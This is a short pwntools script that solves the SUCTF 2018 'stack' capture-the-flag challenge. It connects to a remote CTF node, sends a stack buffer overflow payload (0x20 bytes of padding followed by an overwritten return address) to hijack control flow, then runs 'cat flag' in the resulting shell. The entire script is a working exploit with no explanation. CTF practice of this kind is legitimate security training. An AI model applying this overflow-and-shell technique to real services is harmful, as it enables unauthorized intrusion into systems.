from pwn import *

# sh = process('./SUCTF_2018_stack')
sh = remote('node3.buuoj.cn', 29135)
# gdb.attach(sh, """
#                 b system
#                 """)
sh.send(0x20 * b'a' + p64(0x40067a) * 2)
sh.sendline('cat flag')
sh.interactive()